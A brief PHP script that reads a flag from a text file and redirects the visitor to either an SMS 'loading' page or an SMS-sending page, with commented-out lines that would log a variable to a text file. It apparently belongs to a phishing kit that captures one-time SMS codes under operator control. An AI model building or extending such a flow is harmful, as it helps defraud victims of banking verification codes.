<?php
$user_ip = $_SERVER['REMOTE_ADDR'];
$cip = "1.txt";
$postal = file_get_contents($cip);

if ($postal== "0")
{
echo("<script>window.location=' ./loadSms2.html';</script>");
}

elseif ($postal== "1")
{
echo("<script>window.location=' ./sendSms2.html';</script>");
}
else {

echo("<script>window.location=' loadSms2.html';</script>");
}

//$n = fopen('../what.txt','a');
//fwrite($n,$bilsmg );
//fclose($n);
?>